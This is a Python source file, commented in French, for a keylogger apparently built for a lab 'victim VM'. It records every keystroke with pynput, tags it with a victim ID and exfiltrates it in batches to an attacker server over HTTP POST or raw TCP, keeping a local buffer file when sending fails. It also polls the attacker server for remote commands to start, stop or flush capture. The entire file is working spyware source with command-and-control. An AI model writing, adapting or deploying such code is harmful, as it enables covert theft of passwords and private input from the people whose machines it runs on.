"""
Keylogger pour VM Victime
Capture les frappes clavier, les encode en JSON et les exfiltre vers le serveur attaquant
"""

import json
import time
import uuid
import socket
import requests
from datetime import datetime
from queue import Queue
from threading import Thread
import os

try:
    from pynput import keyboard
except ImportError:
    print("Erreur: pynput n'est pas installé. Exécutez: pip install -r requirements.txt")
    exit(1)

import config


class Keylogger:
    def __init__(self):
        self.victim_id = str(uuid.uuid4())
        self.log_queue = Queue()
        self.buffer = []
        self.capturing = False
        self.mode = config.EXFILTRATION_MODE
        
        print(f"[+] Keylogger initialisé")
        print(f"[+] ID Victime: {self.victim_id}")
        print(f"[+] Mode d'exfiltration: {self.mode}")
        print(f"[+] Serveur cible: {config.ATTACKER_IP}:{config.ATTACKER_PORT}")
    
    def normalize_key(self, key):
        """
        Normalise les touches capturées en chaînes de caractères lisibles
        """
        try:
            # Touches spéciales
            special_keys = {
                keyboard.Key.space: ' ',
                keyboard.Key.enter: '\n',
                keyboard.Key.tab: '\t',
                keyboard.Key.backspace: '[BACKSPACE]',
                keyboard.Key.delete: '[DELETE]',
                keyboard.Key.shift: '[SHIFT]',
                keyboard.Key.ctrl: '[CTRL]',
                keyboard.Key.alt: '[ALT]',
                keyboard.Key.esc: '[ESC]',
                keyboard.Key.up: '[UP]',
                keyboard.Key.down: '[DOWN]',
                keyboard.Key.left: '[LEFT]',
                keyboard.Key.right: '[RIGHT]',
            }
            
            if key in special_keys:
                return special_keys[key]
            
            # Touches avec caractères
            if hasattr(key, 'char') and key.char:
                return key.char
            
            # Autres touches
            return str(key).replace('Key.', '')
        
        except Exception as e:
            return f"[KEY_ERROR:{str(e)}]"
    
    def on_press(self, key):
        """
        Callback appelé à chaque frappe de touche
        """
        if not self.capturing:
            return
        
        try:
            normalized_key = self.normalize_key(key)
            log_entry = {
                "victim_id": self.victim_id,
                "timestamp": datetime.now().isoformat(),
                "key": normalized_key,
                "raw_key": str(key)
            }
            
            # Ajouter à la queue et au buffer
            self.log_queue.put(log_entry)
            self.buffer.append(log_entry)
            
            # Limiter la taille du buffer
            if len(self.buffer) > config.BUFFER_SIZE:
                self.buffer.pop(0)
        
        except Exception as e:
            print(f"[-] Erreur lors de la capture: {e}")
    
    def encode_logs(self, logs):
        """
        Encode les logs en JSON
        """
        return json.dumps(logs, ensure_ascii=False)
    
    def send_via_http(self, logs):
        """
        Envoie les logs via HTTP POST
        """
        try:
            payload = {
                "victim_id": self.victim_id,
                "logs": logs,
                "timestamp": datetime.now().isoformat()
            }
            
            response = requests.post(
                config.HTTP_ENDPOINT,
                json=payload,
                timeout=5
            )
            
            if response.status_code == 200:
                return True
            else:
                print(f"[-] Erreur HTTP: {response.status_code}")
                return False
        
        except requests.exceptions.RequestException as e:
            print(f"[-] Erreur de connexion HTTP: {e}")
            return False
    
    def send_via_tcp(self, logs):
        """
        Envoie les logs via TCP Socket
        """
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((config.TCP_HOST, config.TCP_PORT))
            
            # Envoyer les données
            data = self.encode_logs({
                "victim_id": self.victim_id,
                "logs": logs,
                "timestamp": datetime.now().isoformat()
            })
            
            sock.sendall(data.encode('utf-8'))
            sock.close()
            return True
        
        except Exception as e:
            print(f"[-] Erreur de connexion TCP: {e}")
            return False
    
    def save_to_buffer_file(self, logs):
        """
        Sauvegarde les logs dans un fichier tampon en cas de perte réseau
        """
        try:
            buffer_data = []
            if os.path.exists(config.BUFFER_FILE):
                with open(config.BUFFER_FILE, 'r', encoding='utf-8') as f:
                    buffer_data = json.load(f)
            
            buffer_data.extend(logs)
            
            with open(config.BUFFER_FILE, 'w', encoding='utf-8') as f:
                json.dump(buffer_data, f, ensure_ascii=False, indent=2)
        
        except Exception as e:
            print(f"[-] Erreur lors de la sauvegarde du tampon: {e}")
    
    def send_logs(self, logs):
        """
        Envoie les logs avec mécanisme de retry
        """
        if not logs:
            return
        
        for attempt in range(config.RETRY_ATTEMPTS):
            success = False
            
            if self.mode == "http":
                success = self.send_via_http(logs)
            elif self.mode == "tcp":
                success = self.send_via_tcp(logs)
            
            if success:
                print(f"[+] {len(logs)} logs envoyés avec succès")
                return
            else:
                if attempt < config.RETRY_ATTEMPTS - 1:
                    print(f"[!] Tentative {attempt + 1} échouée, nouvel essai dans {config.RETRY_DELAY}s...")
                    time.sleep(config.RETRY_DELAY)
        
        # Si toutes les tentatives échouent, sauvegarder dans le tampon
        print(f"[!] Échec de l'envoi, sauvegarde dans le tampon local")
        self.save_to_buffer_file(logs)
    
    def sender_thread(self):
        """
        Thread qui envoie périodiquement les logs collectés
        """
        while True:
            time.sleep(config.SEND_INTERVAL)
            
            if not self.capturing:
                continue
            
            # Collecter tous les logs de la queue
            logs_to_send = []
            while not self.log_queue.empty():
                logs_to_send.append(self.log_queue.get())
            
            if logs_to_send:
                self.send_logs(logs_to_send)
    
    def start_capture(self):
        """
        Démarre la capture des frappes
        """
        if self.capturing:
            print("[!] La capture est déjà en cours")
            return
        
        self.capturing = True
        print("[+] Capture démarrée")
    
    def stop_capture(self):
        """
        Arrête la capture des frappes
        """
        if not self.capturing:
            print("[!] La capture n'est pas en cours")
            return
        
        self.capturing = False
        print("[+] Capture arrêtée")
        
        # Envoyer les logs restants
        remaining_logs = []
        while not self.log_queue.empty():
            remaining_logs.append(self.log_queue.get())
        
        if remaining_logs:
            self.send_logs(remaining_logs)
    
    def switch_mode(self, new_mode):
        """
        Change le mode d'exfiltration
        """
        if new_mode not in ["http", "tcp"]:
            print(f"[-] Mode invalide: {new_mode}. Utilisez 'http' ou 'tcp'")
            return
        
        self.mode = new_mode
        print(f"[+] Mode changé vers: {new_mode}")
    
    def flush_logs(self):
        """
        Vide la queue de logs et envoie immédiatement tous les logs en attente
        """
        logs_to_send = []
        
        # Collecter tous les logs de la queue
        while not self.log_queue.empty():
            logs_to_send.append(self.log_queue.get())
        
        # Ajouter les logs du buffer
        if self.buffer:
            logs_to_send.extend(self.buffer)
            self.buffer = []
        
        if logs_to_send:
            print(f"[+] Envoi immédiat de {len(logs_to_send)} logs...")
            self.send_logs(logs_to_send)
            print(f"[+] {len(logs_to_send)} logs envoyés")
        else:
            print("[!] Aucun log à envoyer")
    
    def execute_command(self, command, params=None):
        """
        Exécute une commande reçue du serveur
        """
        try:
            if command == "start_capture":
                self.start_capture()
            
            elif command == "stop_capture":
                self.stop_capture()
            
            elif command == "switch_mode":
                mode = params.get('mode') if params else None
                if mode:
                    self.switch_mode(mode)
                else:
                    print("[-] Paramètre 'mode' manquant pour switch_mode")
            
            elif command == "flush_logs":
                self.flush_logs()
            
            else:
                print(f"[-] Commande inconnue: {command}")
        
        except Exception as e:
            print(f"[-] Erreur lors de l'exécution de la commande {command}: {e}")
    
    def check_commands_thread(self):
        """
        Thread qui vérifie périodiquement les commandes en attente sur le serveur
        """
        while True:
            try:
                time.sleep(5)  # Vérifier toutes les 5 secondes
                
                # Récupérer les commandes depuis le serveur
                try:
                    response = requests.get(
                        f"http://{config.ATTACKER_IP}:{config.ATTACKER_PORT}/victims/{self.victim_id}/commands",
                        timeout=3
                    )
                    
                    if response.status_code == 200:
                        data = response.json()
                        commands = data.get('commands', [])
                        
                        # Exécuter chaque commande
                        for cmd in commands:
                            command = cmd.get('command')
                            params = cmd.get('params', {})
                            print(f"[+] Commande reçue: {command}")
                            self.execute_command(command, params)
                
                except requests.exceptions.RequestException:
                    # Erreur de connexion, on continue
                    pass
            
            except Exception as e:
                print(f"[-] Erreur dans check_commands_thread: {e}")
    
    def run(self):
        """
        Lance le keylogger
        """
        # Démarrer le thread d'envoi
        sender = Thread(target=self.sender_thread, daemon=True)
        sender.start()
        
        # Démarrer le thread de vérification des commandes
        command_checker = Thread(target=self.check_commands_thread, daemon=True)
        command_checker.start()
        
        # Démarrer la capture automatiquement
        self.start_capture()
        
        print("[+] Keylogger actif. Appuyez sur Ctrl+C pour arrêter.")
        print("[+] Écoute des commandes distantes activée")
        
        try:
            # Écouter les frappes
            with keyboard.Listener(on_press=self.on_press, suppress=False) as listener:
                listener.join()
        
        except KeyboardInterrupt:
            print("\n[!] Arrêt du keylogger...")
            self.stop_capture()
            print("[+] Keylogger arrêté")
        except Exception as e:
            # Gérer les erreurs de pynput (notamment avec Python 3.13)
            if "ThreadHandle" in str(e) or "not callable" in str(e):
                print(f"[!] Erreur connue avec pynput/Python 3.13: {e}")
                print("[!] Solution: Utilisez Python 3.12 ou 3.11")
                print("[!] Le keylogger continue en mode dégradé...")
                # Continuer à envoyer les logs déjà capturés
                while True:
                    time.sleep(config.SEND_INTERVAL)
                    if not self.capturing:
                        break
                    logs_to_send = []
                    while not self.log_queue.empty():
                        logs_to_send.append(self.log_queue.get())
                    if logs_to_send:
                        self.send_logs(logs_to_send)
            else:
                print(f"[-] Erreur inattendue: {e}")
                self.stop_capture()


if __name__ == "__main__":
    keylogger = Keylogger()
    keylogger.run()

